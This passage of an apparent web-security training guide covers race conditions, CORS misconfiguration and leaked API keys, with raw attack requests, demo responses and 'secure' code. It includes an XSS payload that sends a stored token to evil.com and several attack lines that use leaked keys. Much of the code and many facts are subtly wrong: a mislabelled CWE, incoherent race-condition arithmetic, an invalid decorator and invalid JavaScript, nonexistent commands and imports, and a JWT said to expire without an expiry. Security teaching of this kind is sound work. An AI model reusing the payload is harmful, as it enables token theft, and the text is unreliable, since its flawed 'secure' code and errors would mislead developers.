  "total": 1.00,
  "message": "Order processed (100 x $0.01)"
}
```
*   **Result**: Price tampered from $10 → $0.01 → $1 total ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Server-Side Business Logic Validation)
@app.route('/api/checkout')
def checkout(cart_total, coupons):
    # 1. Fetch user's trial count from DATABASE (NOT request)
    user = db.get_user(current_user.id)
    
    # 2. Validate ONE coupon per order
    if len(coupons) > 1:
        raise ValidationError("Only one coupon per order")
    
    # 3. Calculate discount server-side
    coupon = db.get_coupon(coupons)
    discount = min(coupon.discount_percent, 50)  # Max 50%
    
    # 4. Validate cumulative discount
    if discount > 50:
        raise ValidationError("Maximum 50% discount")
    
    # 5. Calculate total server-side
    final_total = cart_total * (1 - discount/100)
    
    return {"finalTotal": final_total}

@app.route('/api/refund')
def refund(amount):
    # 1. Use DATABASE transactions (ACID compliance)
    user = db.get_user(current_user.id)
    
    # 2. Synchronous balance check
    if user.balance < amount:
        raise ValidationError("Insufficient balance")
    
    # 3. Atomic transaction (balance updated immediately)
    with db.transaction():
        user.balance -= amount
        user.refund_history.append(amount)
        db.save(user)
    
    return {"success": True}
```

---

### Module 18: Race Condition Vulnerabilities (TOCTOU)
*   **CWE Mapping**: CWE-367 (Time-of-Check vs Time-of-Use)
*   **OWASP Top 10 Reference**: A05:2021-Broken Access Control (Race Conditions)

#### Low-Level Architectural Mechanics
Race conditions occur when system checks a condition (Time-of-Check) but the condition changes before the action executes (Time-of-Use).

**Pattern 1: Double-Spending Attacks**
- System: `balance -= amount` (no transaction lock)
- T0: `balance = 1000`, `check: balance >= 100` → ✅ PASS
- T1: `balance = 1000`, `check: balance >= 100` → ✅ PASS (same balance)
- T2: `balance = 900` (first spending completes)
- T3: `balance = 800` (second spending completes)
- Result: Spent $200 from $1000 balance (should be $900)

**Pattern 2: Concurrent Vote Submission**
- System: `votes[user_id]++` (no vote limit check)
- T0: `user votes 5 times` (API sends 5 requests)
- T1: Server processes all 5 votes before checking limit
- Result: 5 votes counted (should be 1)

**Pattern 3: Time-Based Account Deletion**
- System: `if account.created_at < NOW() - 30days: delete()`
- T0: `account.created_at = NOW() - 29days` (check passes)
- T1: `NOW() - 30days` (deletion scheduled)
- T2: `account.created_at` updated (prevents deletion)
- Result: Account deleted even though not old enough

**Pattern 4: Lock Mechanism Bypass**
- System: `if lock == NONE: set_lock(user_id); process()`
- T0: `lock = NONE` → `lock = userA` (userA starts)
- T1: `lock = NONE` → `lock = userB` (userB starts)
- Result: Both users process simultaneously (lock failed)

#### 🎯 Raw Double-Spending Attack
```text
# Request 1 (T=0.000s)
POST /api/transfer HTTP/1.1
{
  "fromUser": 123,
  "toUser": 456,
  "amount": 500
}

# Request 2 (T=0.001s)
POST /api/transfer HTTP/1.1
{
  "fromUser": 123,
  "toUser": 789,
  "amount": 500
}
```

#### 📄 Demo Server Response (Double Spending)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "transferId": 1,
  "amount": 500,
  "message": "Transfer 1 processed"
}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "transferId": 2,
  "amount": 500,
  "message": "Transfer 2 processed"
}
```
*   **Result**: Both transfers processed from $1000 balance ✓

#### 🎯 Raw Concurrent Vote Submission
```text
# Request 1 (T=0.000s)
POST /api/vote HTTP/1.1
{
  "postId": 123,
  "userId": 456
}

# Request 2 (T=0.001s)
POST /api/vote HTTP/1.1
{
  "postId": 123,
  "userId": 456
}

# Request 3 (T=0.002s)
POST /api/vote HTTP/1.1
{
  "postId": 123,
  "userId": 456
}
```

#### 📄 Demo Server Response (5 Votes)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "voteCount": 5,
  "message": "5 votes counted"
}
```
*   **Result**: User voted 5 times (should be 1) ✓

#### 🎯 Raw Lock Mechanism Bypass
```text
# Request 1 (T=0.000s) - User A
POST /api/process HTTP/1.1
{
  "resourceId": 123,
  "userId": "userA"
}

# Request 2 (T=0.001s) - User B
POST /api/process HTTP/1.1
{
  "resourceId": 123,
  "userId": "userB"
}
```

#### 📄 Demo Server Response (Lock Bypassed)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "lockedBy": "userA",
  "message": "Resource locked by userA"
}

HTTP/1.1 200 OK
Content-Type: application/json

{
  "success": true,
  "lockedBy": "userB",
  "message": "Resource locked by userB"
}
```
*   **Result**: Both users locked resource (lock failed) ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Database Transactions + Locking)
from sqlalchemy import transaction

@app.route('/api/transfer')
def transfer(from_user, to_user, amount):
    # 1. Use DATABASE transaction (ACID compliance)
    with db.transaction():
        # 2. LOCK the row (prevents concurrent access)
        from_account = db.get_account(from_user, lock=True)
        
        # 3. Check balance INSIDE transaction
        if from_account.balance < amount:
            raise ValidationError("Insufficient balance")
        
        # 4. Update balance INSIDE transaction (atomic)
        from_account.balance -= amount
        to_account = db.get_account(to_user)
        to_account.balance += amount
        
        db.save(from_account)
        db.save(to_account)
    
    return {"success": True}

@app.route('/api/vote')
def vote(post_id, user_id):
    # 1. Use DATABASE transaction
    with db.transaction():
        # 2. LOCK the vote count row
        post = db.get_post(post_id, lock=True)
        
        # 3. Check vote limit INSIDE transaction
        existing_vote = db.get_vote(post_id, user_id)
        if existing_vote:
            raise ValidationError("Already voted")
        
        # 4. Add vote INSIDE transaction
        post.vote_count += 1
        db.save_vote(post_id, user_id)
    
    return {"success": True}

@app.route('/api/process')
def process(resource_id, user_id):
    # 1. Use DATABASE transaction with lock
    with db.transaction():
        # 2. LOCK the resource row
        resource = db.get_resource(resource_id, lock=True)
        
        # 3. Check lock INSIDE transaction
        if resource.locked_by:
            raise ValidationError("Resource already locked")
        
        # 4. Set lock INSIDE transaction
        resource.locked_by = user_id
        resource.locked_at = NOW()
        db.save(resource)
    
    return {"success": True}
```

---

### Module 19: CORS Misconfiguration
*   **CWE Mapping**: CWE-942 (Cross-Site Request Forgery)
*   **OWASP Top 10 Reference**: A01:2021-Broken Access Control (CORS)

#### Low-Level Architectural Mechanics
CORS (Cross-Origin Resource Sharing) allows browsers to make requests to different domains. Misconfiguration exposes sensitive data to malicious sites.

**Attack 1: Wildcard Origin Abuse**
- Vulnerable response: `Access-Control-Allow-Origin: *`
- Attacker site: `https://evil.com`
- Victim browser: `GET https://api.com/user` → `Origin: https://evil.com`
- API response: `Access-Control-Allow-Origin: *` + `{"apiKey": "secret"}`
- Attacker JS: `fetch("https://api.com/user").then(res => res.json())`
- Result: `apiKey` exposed to evil.com

**Attack 2: Null Origin Attacks**
- Vulnerable response: `Access-Control-Allow-Origin: null`
- Attacker site: `<iframe src="https://evil.com">`
- Browser sets: `Origin: null` (for iframe)
- API response: `Access-Control-Allow-Origin: null` + data
- Attacker JS: `document.querySelector('iframe').contentWindow.data`
- Result: Data exposed via iframe

**Attack 3: Access-Control-Allow-Credentials Bypass**
- Vulnerable: `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true`
- Attacker site: `https://evil.com` sends `Cookie: session=attacker`
- Browser: `GET https://api.com/user` with `Cookie: session=victim`
- API response: `Access-Control-Allow-Credentials: true` + data
- Attacker JS: `fetch("https://api.com/user").then(res => res.json())`
- Result: Victim's authenticated data exposed

**Attack 4: Sensitive Data Exposure**
- API endpoint: `GET /api/user-details` (returns `email`, `ssn`, `creditCard`)
- CORS: `Access-Control-Allow-Origin: https://trusted.com` (whitelist)
- Attacker: `https://trusted.com` is legitimate but compromised
- Attacker JS on trusted.com: `fetch("/api/user-details")`
- Result: Sensitive data exposed via compromised trusted site

#### 🎯 Raw Wildcard Origin Attack
```text
GET /api/user HTTP/1.1
Host: api.com
Origin: https://evil.com
Cookie: session=victim_session
```

#### 📄 Demo Server Response (Wildcard Abuse)
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json

{
  "userId": 123,
  "email": "victim@example.com",
  "apiKey": "abcdef123456",
  "ssn": "123-45-6789"
}
```
*   **Result**: Wildcard origin exposes sensitive data to evil.com ✓

#### 🎯 Raw Null Origin Attack
```html
<!-- Attacker HTML -->
<!DOCTYPE html>
<html>
<iframe src="https://api.com/api/user" id="victim"></iframe>
<script>
  setTimeout(() => {
    const data = document.getElementById('victim').contentWindow.data;
    console.log(data); // Exposed!
  }, 1000);
</script>
</html>
```

#### 📄 Demo Server Response (Null Origin Abuse)
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "userId": 123,
  "email": "victim@example.com",
  "apiKey": "abcdef123456"
}
```
*   **Result**: Null origin via iframe exposes data ✓

#### 🎯 Raw Credentials Bypass Attack
```text
GET /api/user-details HTTP/1.1
Host: api.com
Origin: https://evil.com
Cookie: session=victim_session
```

#### 📄 Demo Server Response (Credentials Bypassed)
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{
  "userId": 123,
  "email": "victim@example.com",
  "ssn": "123-45-6789",
  "creditCard": "4111-1111-1111-1111"
}
```
*   **Result**: Credentials bypass exposes authenticated data ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Strict CORS Configuration)
from flask_cors import CORS

# Initialize CORS with strict settings
CORS(app, 
     origins=["https://trusted.com"],  # Specific whitelist
     supports_credentials=False,         # NEVER allow credentials
     methods=["GET", "POST"])            # Restrict methods

@app.route('/api/user')
def get_user():
    # 1. Validate Origin header explicitly
    allowed_origins = ["https://trusted.com", "https://app.com"]
    if request.headers.get('Origin') not in allowed_origins:
        return {"error": "Origin not allowed"}, 403
    
    # 2. Set CORS headers explicitly
    response = make_response({
        "userId": 123,
        "email": "user@example.com"
        # ❌ NO sensitive data (ssn, apiKey)
    })
    response.headers['Access-Control-Allow-Origin'] = request.headers.get('Origin')
    response.headers['Access-Control-Allow-Credentials'] = 'false'  # NEVER true
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST'
    response.headers['Access-Control-Max-Age'] = '86400'  # 24 hours
    
    return response
```

#### Browser Security Note
```javascript
// ✅ SECURE (Frontend CORS Validation)
const fetchWithCORS = async (url) {
  const response = await fetch(url);
  
  // 1. Validate CORS origin
  const allowedOrigins = ["https://trusted.com"];
  if (!allowedOrigins.includes(response.headers.get('Access-Control-Allow-Origin'))) {
    throw new Error('CORS validation failed');
  }
  
  // 2. Validate no credentials
  if (response.headers.get('Access-Control-Allow-Credentials') === 'true') {
    console.warn('WARNING: Credentials allowed (insecure)');
  }
  
  return response.json();
};
```

---

### Module 20: API Key/Token Leakage
*   **CWE Mapping**: CWE-522 (Insufficiently Protected Credentials)
*   **OWASP Top 10 Reference**: A02:2021-Cryptographic Failures

#### Low-Level Architectural Mechanics
API keys and tokens exposed in client-side code, version control, or mobile apps allow attackers to impersonate users or access sensitive systems.

**Pattern 1: Keys in HTML/JavaScript**
- Vulnerable: `<script>const API_KEY = "abc123xyz789";</script>`
- Attacker: `View Source` → Extract API key
- Attack: `curl -H "Authorization: Bearer abc123xyz789" https://api.com/users`
- Result: Full API access with leaked key

**Pattern 2: Tokens in localStorage**
- Vulnerable: `localStorage.setItem('token', 'user_token_123')`
- Attacker: XSS → `document localStorage.token`
- Attack: `curl -H "Authorization: Bearer user_token_123" https://api.com/admin`
- Result: User impersonation via stolen token

**Pattern 3: Secrets in Version Control**
- Vulnerable: `config.js` with `API_KEY = "secret123"` committed to GitHub
- Attacker: `git clone https://github.com/vulnerable/app` → Extract key
- Attack: `curl https://api.com/users?key=secret123`
- Result: API key exposed via public repository

**Pattern 4: Mobile App Extraction**
- Vulnerable: Android APK with `API_KEY = "mobile_key_123"` in `strings.xml`
- Attacker: `apktool extract vulnerable.apk` → Extract strings.xml → Get key
- Attack: `curl -H "Authorization: mobile_key_123" https://api.com/admin`
- Result: Mobile API key extracted from APK

#### 🎯 Raw HTML Key Extraction
```html
<!-- Vulnerable HTML -->
<!DOCTYPE html>
<html>
<script>
const API_KEY = "abcdef123456xyz789";
const API_URL = "https://api.com/v1";

function getUser() {
  fetch(API_URL + "/user", {
    headers: { "Authorization": API_KEY }
  });
}
</script>
</html>
```

#### 🎯 Raw Key from HTML (Attack)
```text
GET /index.html HTTP/1.1
Host: vulnerable-app.com
```

#### 📄 Demo Server Response (Key Exposed)
```html
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<script>
const API_KEY = "abcdef123456xyz789";  // ← LEAKED!
const API_URL = "https://api.com/v1";
</script>
</html>
```
*   **Result**: API key extracted from HTML source ✓

#### 🎯 Raw localStorage Token (XSS)
```javascript
// Attacker XSS payload
<script>
const token = localStorage.getItem('token');
fetch('https://evil.com/steal?token=' + token);
</script>
```

#### 🎯 Raw Token Theft (Attack)
```text
GET /?token=user_token_123 HTTP/1.1
Host: evil.com
```

#### 📄 Demo Server Response (Token Stolen)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "token received",
  "token": "user_token_123"  // ← STOLEN!
}
```
*   **Result**: User token stolen via XSS from localStorage ✓

#### 🎯 Raw Version Control Leak
```javascript
// config.js (committed to GitHub)
module.exports = {
  API_KEY: "github_secret_123xyz",
  DATABASE_URL: "postgres://user:pass@db.com/app",
  AWS_SECRET: "aws_secret_key_456"
};
```

#### 🎯 Raw Git Clone (Attack)
```text
git clone https://github.com/vulnerable/app.git
```

#### 📄 Demo Server Response (Secrets Exposed)
```javascript
// config.js
module.exports = {
  API_KEY: "github_secret_123xyz",  // ← LEAKED!
  DATABASE_URL: "postgres://user:pass@db.com/app",  // ← LEAKED!
  AWS_SECRET: "aws_secret_key_456"  // ← LEAKED!
};
```
*   **Result**: API key, DB credentials, AWS secret exposed in GitHub ✓

#### 🎯 Raw Mobile APK Extraction
```xml
<!-- strings.xml (inside Android APK) -->
<resources>
  <string name="api_key">mobile_api_key_123xyz</string>
  <string name="aws_secret">aws_mobile_secret_456</string>
</resources>
```

#### 🎯 Raw APKTool Extraction (Attack)
```text
apktool extract vulnerable.apk
```

#### 📄 Demo Server Response (APK Extracted)
```xml
<!-- strings.xml -->
<resources>
  <string name="api_key">mobile_api_key_123xyz</string>  <!-- ← LEAKED! -->
  <string name="aws_secret">aws_mobile_secret_456</string>  <!-- ← LEAKED! -->
</resources>
```
*   **Result**: Mobile API key, AWS secret extracted from APK ✓

#### Backend Should Implement (Secure Implementation)
```python
# ✅ SECURE (Environment Variables + Key Management)
import os
from dotenv import load_dotenv

# 1. Load environment variables (NOT in code)
load_dotenv()  # Loads from .env file (NOT committed)

# 2. Get secrets from environment (NOT hardcoded)
API_KEY = os.getenv('API_KEY')  # From .env file
DATABASE_URL = os.getenv('DATABASE_URL')  # From .env file
AWS_SECRET = os.getenv('AWS_SECRET')  # From .env file

# 3. Use AWS Secrets Manager (cloud-based)
import boto3

secrets_client = boto3.client('secretsmanager')

def get_api_key():
    secret = secrets_client.get_secret_value(
        SecretId='api/app/api-key'
    )
    return secret['SecretString']

# 4. Use JWT with short expiration (NOT long-lived tokens)
from jose import jwt

def create_access_token(user_id):
    token = jwt.encode(
        {'user_id': user_id, 'type': 'access'},
        os.getenv('JWT_SECRET'),
        algorithm='HS256'
    )
    # Token expires in 15 minutes
    return token
```

#### Frontend Security Note
```javascript
// ✅ SECURE (Token Management)
// 1. Store token in sessionStorage (NOT localStorage)
sessionStorage.setItem('token', token);

// 2. Use JWT with short expiration
const token = await fetch('/api/auth/login', {
  method: 'POST',
  body: JSON.stringify({ username, password })
}).then(res => res.json());

// 3. Refresh token automatically
const refreshToken = async () => {
  const newToken = await fetch('/api/auth/refresh', {
    headers: { 'Authorization': sessionStorage.getItem('token') }
  }).then(res => res.json());
  
  sessionStorage.setItem('token', newToken.token);
};

// 4. NEVER hardcode API keys in frontend
const API_URL = process.env.API_URL;  // From environment variables
```

#### Git Security Note
```bash
# ✅ SECURE (Git Credential Management)
# 1. Use .gitignore to exclude secrets
echo ".env" >> .gitignore
echo "config.js" >> .gitignore
echo "credentials.json" >> .gitignore

# 2. Use git-secrets to prevent committed secrets
git secrets --install
git secrets --register AWS_SECRET
git secrets --add .env

# 3. Use environment variables (.env file NEVER committed)
cat > .env << EOF
API_KEY=secret123
DATABASE_URL=postgres://user:pass@db.com/app
AWS_SECRET=aws_key_456
EOF

# 4. Use AWS Secrets Manager (cloud-based)
aws secretsmanager create-secret \
  --name api/app/api-key \
  --secret-string "secret123"
```

---

## 🔧 Detection & Exploitation Methodology

### Step 1: Identify Access Control Points
**Techniques**:
1. **Role enumeration**: Find `admin`, `user`, `moderator` parameters
2. **URL discovery**: Check `robots.txt`, JavaScript source, error messages
3. **Parameter Analysis**: Look for `id=`, `role=`, `admin=`, `userId=`
4. **HTTP Method**: Test `GET`, `POST`, `PUT`, `DELETE`, `POSTX`

### Step 2: Test Vertical Escalation
**Techniques**:
1. **URL guessing**: `/admin`, `/administrator`, `/admin-panel`
2. **Parameter tampering**: `admin=false` → `admin=true`, `role=1` → `role=2`
3. **Cookie manipulation**: `role=user` → `role=admin`
4. **JSON body**: `{"roleid": 1}` → `{"roleid": 2}`
5. **Header override**: `X-Original-URL: /admin`
6. **Method bypass**: `POST` → `GET`
7. **Trailing slash**: `/admin` → `/admin/`

### Step 3: Test Horizontal Escalation
**Techniques**:
1. **IDOR**: `id=123` → `id=124`
2. **GUID extraction**: Find IDs in URLs, messages, reviews
3. **Username tampering**: `id=peter` → `id=carlos`
4. **Redirect leakage**: Check response body on 302 redirects

### Step 4: Test Multi-Step Bypass
**Techniques**:
1. **Step skipping**: Direct access to step 3
2. **Parameter injection**: Add `role=admin` to step 3
3. **State manipulation**: Skip validation steps

### Step 5: Test Header-Based Bypass
**Techniques**:
1. **Referer forgery**: `Referer: /admin`
2. **X-Forwarded-For**: `X-Forwarded-For: US_IP`
3. **Origin manipulation**: `Origin: https://admin.site.com`

---

## 🛡️ Prevention Strategies

### Defense-in-Depth Principles
1. **Never rely on obfuscation alone**: Hiding URLs ≠ security
2. **Deny by default**: Unless public, block access
3. **Single mechanism**: Use ONE app-wide access control system
4. **Mandatory declaration**: Developers MUST declare access for each resource
5. **Thorough auditing**: Test ALL access control points

### Secure Implementation Checklist
```python
# ✅ SECURE ACCESS CONTROL PATTERN
from functools import wraps

def require_role(required_role):
    @wraps(func)
    def decorator(func):
        def wrapper(*args, **kwargs):
            # 1. Check authentication
            if not current_user.is_authenticated:
                return redirect('/login')
            
            # 2. Check role from DATABASE (NOT client)
            if current_user.role != required_role:
                raise AuthorizationError("Access denied")
            
            # 3. Validate ALL parameters
            for param, value in kwargs.items():
                if not validate_parameter(param, value):
                    raise ValidationError("Invalid parameter")
            
            # 4. Check ownership (for horizontal)
            if resource_owner_id != current_user.id:
                raise AuthorizationError("Access denied")
            
            return func(*args, **kwargs)
        return wrapper
    return decorator

@app.route('/admin/deleteUser')
@require_role('ADMIN')
def delete_user(username):
    db.delete_user(username)
```

### Key Prevention Strategies
1. **Server-side authorization**: NEVER client-side (JavaScript)
2. **Role from session/database**: NEVER from request parameters
3. **Ownership validation**: Check `resource.owner_id == user.id`
4. **Parameter validation**: Validate ALL input types/values
5. **No data in errors/redirects**: Don't leak sensitive data
6. **Authorization on EVERY endpoint**: Not just top-level
7. **Normalize URLs**: Lowercase, no trailing slash
8. **Validate HTTP methods**: Only allow intended methods
9. **No Referer checks**: Use server-side auth
10. **Generate new session IDs**: After login (not from request)

---

## 🎯 Key Takeaways

### When to Hunt for Access Control Vulnerabilities
- Predictable IDs in URLs (`id=123`, `id=124`)
- Role parameters in requests (`admin=`, `role=`)
- Unlinked admin URLs (check `robots.txt`, JS)
- Multi-step processes (try skipping steps)
- HTTP method restrictions (test GET vs POST)
- URL-based restrictions (test trailing slash, case)
- Redirect responses (check body on 302)
- Referer header checks (forge the header)
- Location-based restrictions (use VPN)

### Best Tools
- **Burp Repeater**: Test parameter/URL tampering
- **Burp Proxy**: Intercept login responses (cookies)
- **Browser DevTools**: Extract JS URLs/GUIDs
- **curl**: Forge headers (`-H "Referer: /admin"`)
- ****oauth** testers**: Test OAuth flow bypass
- **JWT tools**: Manipulate JWT tokens

### Critical Concepts
- **Vertical escalation**: Non-admin → Admin access
- **Horizontal escalation**: User A → User B data
- **IDOR**: Direct object reference without ownership check
- **Parameter tampering**: Modify `admin=false` → `admin=true`
- **URL guessing**: Access `/admin` without link
- **Multi-step bypass**: Skip steps 1-2, go to step 3
- **Referer forgery**: Set `Referer: /admin` header
- **HTTP method bypass**: Use `GET` instead of `POST`
- **Header override**: `X-Original-URL` bypasses URL checks
- **JWT manipulation**: Change `"role": "user"` → `"role": "admin"`
- **Session fixation**: Pre-set session ID before login

---

## 📚 References & Whitepapers

- **PortSwigger Access Control**: [Access control vulnerabilities](https://portswigger.net/web-security/access-control)
- **OWASP Top 10 2021**: [A01:2021-Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **OWASP API Top 10 2023**: [API1:2023-BOLA](https://owasp.org/www-project-api-security/)
- **OWASP Access Control**: [Access control cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
- **IDOR Guide**: [Insecure Direct Object References](https://portswigger.net/web-security/access-control/idor)
- **JWT Security**: [JWT authentication best practices](https://auth0.com/blog/jwt-security-best-practices/)
- **OAuth Security**: [OAuth 2.0 security best practices](https://oauth.net/2/security-best-practices/)
